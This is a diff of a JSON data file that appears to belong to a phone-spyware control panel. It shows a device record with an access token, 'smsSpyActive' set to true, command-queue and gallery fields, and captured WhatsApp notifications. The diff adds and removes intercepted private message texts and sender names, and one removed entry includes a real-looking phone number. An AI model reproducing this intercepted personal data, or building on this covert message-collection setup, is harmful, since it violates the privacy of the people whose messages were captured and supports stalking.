@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776861189679,
+    "lastSeen": 1776861216701,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "prily 🤍",
+        "content": "yaudah malam ini makan besok jangan di makan sisanya",
+        "time": "22/04 20:33",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776861217785
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎59 pesan dari 37 chat",
+        "time": "22/04 20:33",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776861192849
+      },
       {
         "appName": "WhatsApp",
         "sender": "prily 🤍",
@@ -4003,22 +4019,6 @@
         "time": "22/04 15:16",
         "pkg": "com.whatsapp",
         "receivedAt": 1776842198289
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎Pegasus-X Room (5 pesan): ~ BOT FATIRR",
-        "content": "Sayonara @⁨+62 895-0212-2818⁩",
-        "time": "22/04 15:16",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776842198139
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎71 pesan dari 2 chat",
-        "time": "22/04 15:16",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776842167770
       }
     ],
     "galleryPhotos": [],
